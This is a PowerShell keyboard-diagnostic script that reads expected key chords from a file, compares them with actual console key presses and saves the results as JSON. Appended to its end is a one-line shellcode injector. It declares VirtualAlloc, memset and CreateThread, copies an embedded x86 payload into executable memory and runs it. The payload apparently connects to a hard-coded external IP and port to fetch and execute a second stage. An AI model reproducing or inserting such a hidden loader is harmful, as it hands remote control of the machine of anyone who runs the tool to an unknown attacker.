[CmdletBinding()]
param($maxKeys = 25)

class KeyInfo
{
    KeyInfo([string]$k, [ConsoleKeyInfo]$ki, [bool]$investigate)
    {
        $this.Key = $k
        $this.KeyChar = $ki.KeyChar
        $this.ConsoleKey = $ki.Key
        $this.Modifiers = $ki.Modifiers
        $this.Investigate = $investigate
    }

    [string]$Key
    [string]$KeyChar
    [string]$ConsoleKey
    [string]$Modifiers
    [bool]$Investigate
}

$quit = $false

function ReadOneKey {
    param(
        [string]$key,
        [string]$prompt = 'Enter <{0}>'
    )

    function Test-ConsoleKeyInfos($k1, $k2, $key) {
        if ($k1.Modifiers -ne $k2.Modifiers) {
            
            if ($key.Length -eq 1) {
                
                
                if ($k1.Modifiers -band [ConsoleModifiers]::Control -or
                    $k2.Modifiers -band [ConsoleModifiers]::Control) {
                    return $false
                }
            }
        }
        if ($k1.Key -ne $k2.Key) {
            $keyOk = $false
            switch -regex ($k1.Key,$k2.Key) {
            '^Oem.*' { $keyOk = $true; break }
            '^D[0-9]$' { $keyOk = $true; break }
            '^NumPad[0-9]$' { $keyOk = $true; break }
            }
            if (!$keyOk) {
                return $false
            }
        }

        return $k1.KeyChar -eq $k2.KeyChar
    }

    $expectedKi = [Microsoft.PowerShell.ConsoleKeyChordConverter]::Convert($key)[0]

    Write-Host -NoNewline ("`n${prompt}: " -f $key)
    $ki = [Console]::ReadKey($true)
    if ($ki.KeyChar -ceq 'Q') { $script:quit = $true; return }

    $investigate = $false
    $doubleChecks = 0
    while (!(Test-ConsoleKeyInfos $ki $expectedKi $key)) {
        $doubleChecks++

        if ($doubleChecks -eq 1) {
            Write-Host -NoNewline "`nDouble checking that last result, enter <${k}> again: "
        } else {
            Write-Host -NoNewline "`nLast result not confirmed, enter <Spacebar> to skip or enter <${k}> to try again: "
            $investigate = $true
        }
        $kPrev = $ki
        $ki = [Console]::ReadKey($true)
        if ($ki.KeyChar -ceq 'Q') { $quit = $true; return }
        if ($ki.Key -eq [ConsoleKey]::Spacebar) {
            $ki = $kPrev
            break
        }

        if (Test-ConsoleKeyInfos $ki $kPrev $key) {
            break
        }
    }

    return [KeyInfo]::new($key, $ki, $investigate)
}

$setConsoleInputMode = $false
try
{
    if ($PSVersionTable.PSVersion.Major -lt 6 -or $IsWindows)
    {
        Add-Type @"
            using System;
            using System.Runtime.InteropServices;

            public class KeyInfoNativeMethods
            {
                [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
                public static extern IntPtr GetStdHandle(int handleId);

                [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
                public static extern bool GetConsoleMode(IntPtr hConsoleOutput, out uint dwMode);

                [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
                public static extern bool SetConsoleMode(IntPtr hConsoleOutput, uint dwMode);

                public static uint GetConsoleInputMode()
                {
                    var handle = GetStdHandle(-10);
                    uint mode;
                    GetConsoleMode(handle, out mode);
                    return mode;
                }

                public static void SetConsoleInputMode(uint mode)
                {
                    var handle = GetStdHandle(-10);
                    SetConsoleMode(handle, mode);
                }
            }
"@

        [Flags()]
        enum ConsoleModeInputFlags
        {
            ENABLE_PROCESSED_INPUT = 0x0001
            ENABLE_LINE_INPUT = 0x0002
            ENABLE_ECHO_INPUT = 0x0004
            ENABLE_WINDOW_INPUT = 0x0008
            ENABLE_MOUSE_INPUT = 0x0010
            ENABLE_INSERT_MODE = 0x0020
            ENABLE_QUICK_EDIT_MODE = 0x0040
            ENABLE_EXTENDED_FLAGS = 0x0080
            ENABLE_AUTO_POSITION = 0x0100
            ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0200
        }

        $prevMode = [KeyInfoNativeMethods]::GetConsoleInputMode()
        $mode = $prevMode -band
                -bnot ([ConsoleModeInputFlags]::ENABLE_PROCESSED_INPUT -bor
                        [ConsoleModeInputFlags]::ENABLE_LINE_INPUT  -bor
                        [ConsoleModeInputFlags]::ENABLE_WINDOW_INPUT -bor
                        [ConsoleModeInputFlags]::ENABLE_MOUSE_INPUT)
        Write-Verbose "Setting mode $mode"
        [KeyInfoNativeMethods]::SetConsoleInputMode($mode)
        $setConsoleInputMode = $true
    }
    else {
        [Console]::TreatControlCAsInput = $true
    }

    $keyData = [System.Collections.Generic.List[KeyInfo]]::new()

    $keys = Get-Content $PSScriptRoot\keydata.txt
    $keys = $keys | Get-Random -Count $keys.Count
    for ($i = 0; $i -lt $keys.Count; $i++) {
        $k = $keys[$i]
        if ($k -ceq 'Q') { continue }
        $ki = ReadOneKey $k
        if ($quit) { break }
        $keyData.Add($ki)
    }
}
finally
{
    if ($setConsoleInputMode) {
        [KeyInfoNativeMethods]::SetConsoleInputMode($prevMode)
    }
    else {
        [Console]::TreatControlCAsInput = $false
    }

    $keyData | ConvertTo-Json | Out-File -Encoding ascii KeyInfo.json
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xb5,0x41,0x62,0x4e,0x68,0x02,0x00,0x1f,0x96,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

